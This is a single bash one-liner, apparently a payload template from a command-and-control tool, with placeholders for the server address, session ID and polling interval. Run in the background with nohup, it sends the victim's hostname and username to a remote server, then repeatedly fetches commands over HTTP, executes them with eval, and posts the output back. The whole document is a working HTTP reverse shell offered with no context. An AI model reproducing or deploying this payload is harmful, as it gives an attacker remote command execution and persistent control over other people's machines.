nohup `s=*SERVERIP*&&i=*SESSIONID*&&hname=$(hostname)&&p=http://;curl -s "$p$s/*VERIFY*/$hname/$USER" -H "*HOAXID*: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/*GETCMD*" -H "*HOAXID*: $i")&&[ "$c" != None ]&&r=$(eval "$c")&&$([ $r == byee ]&&pkill -P $$||curl -s $p$s/*POSTRES* -X POST -H "*HOAXID*: $i" -d "$r";echo $$)&&sleep *FREQ*;done;`&